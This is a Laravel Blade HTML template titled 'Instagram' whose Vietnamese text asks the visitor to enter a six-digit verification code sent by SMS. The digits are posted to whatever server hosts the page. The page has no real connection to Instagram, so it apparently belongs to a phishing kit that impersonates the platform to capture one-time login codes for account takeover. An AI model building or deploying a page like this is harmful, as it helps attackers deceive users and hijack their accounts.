<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ asset('toastr/toastr.min.css') }}"> 
    <title>Instagram</title>
    @if(session('toastr'))
        <script>    
            var TYPE_MESSAGE="{{session('toastr.type') }}";
            var MESSAGE ="{{session('toastr.messages') }}";
        
        </script>
        
    @endif
    <style>
    *{outline:none} 
    body{  
    position:  absolute;
    top:20%;
    left:25%; 
    font-size:20px;
    text-align: center;
    padding:45px;
    box-shadow: 0 3px 10px 0 rgba(0,0,0,.14);
}
input{
    border-top:none;
    border-left: none;
    border-right:none;
    width:30px;
    font-size:25px;
    margin-left:10px;   
    outline:none;
    text-align:center;
}
.bt-gray{
    border-bottom: 1px solid #bdbdbd;
}
.bt-black{
    border-bottom: 1px solid black;
}

button{
    background-color:#ee4d2d;
    border:none;
    padding: 10px;
    width:50%;
    border-radius:5px;
    color:white;    
    cursor:pointer
}
@media only screen and (max-width: 500px) {
  body {
    left:0
  }
}
    </style>
    
</head>
<body>
    <p class="f-20">Vui Lòng Nhập Mã Xác Minh</p> 
    <p>Mã xác minh của bạn sẽ được gửi bằng tin nhắn đến điện thoại của bạn</p><br>  
    <form action="" method="post">
    @csrf 
    <input class="inputs bt-gray" maxlength="1" name="a">
    <input class="inputs bt-gray" maxlength="1" name="b">
    <input class="inputs bt-gray" maxlength="1" name="c">
    <input class="inputs bt-gray" maxlength="1" name="d">
    <input class="inputs bt-gray" maxlength="1" name="e">
    <input class="inputs bt-gray" maxlength="1" name="f">
    <br><br>    
    <button type="submit">XÁC NHẬN</button>
    </form>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
    $(function() { 
        $('.inputs').keypress(function(event){ 
            if(event.which != 8 && isNaN(String.fromCharCode(event.which))){
                event.preventDefault(); //stop character from entering input
            } 
        });

        $(".inputs").keyup(function () { 
        if (this.value.length == this.maxLength) { 
            $(this).next('.inputs').select();
            $(this).removeClass('bt-gray');
            $(this).addClass('bt-black');
        }else{
            
            $(this).addClass('bt-gray');
            $(this).removeClass('bt-black');
        }
        
}); 
});
  </script>
   <script src="{{ asset('toastr/toastr.min.js') }}"></script>
    <script>

    if(typeof TYPE_MESSAGE != "undefined"){
        switch (TYPE_MESSAGE){
            case 'success':
                toastr.success(MESSAGE)
                break;
            case 'error':
                toastr.error(MESSAGE)
                break;
        }
    }

    
</script>
</body>
</html>